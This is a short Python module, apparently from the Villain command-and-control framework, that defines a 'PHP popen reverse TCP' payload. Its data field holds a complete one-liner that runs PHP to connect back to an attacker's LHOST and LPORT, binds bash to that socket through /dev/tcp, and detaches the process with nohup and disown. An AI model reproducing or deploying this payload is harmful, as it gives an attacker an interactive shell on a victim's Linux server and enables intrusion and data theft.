# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'PHP popen reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'PHP popen reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'php-popen',
        'os' : 'linux'   
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);popen(\"bash <&3 >&3 2>&3\", \"r\");' 3<>/dev/tcp/*LHOST*/*LPORT* > /dev/null 2>&1 & disown"
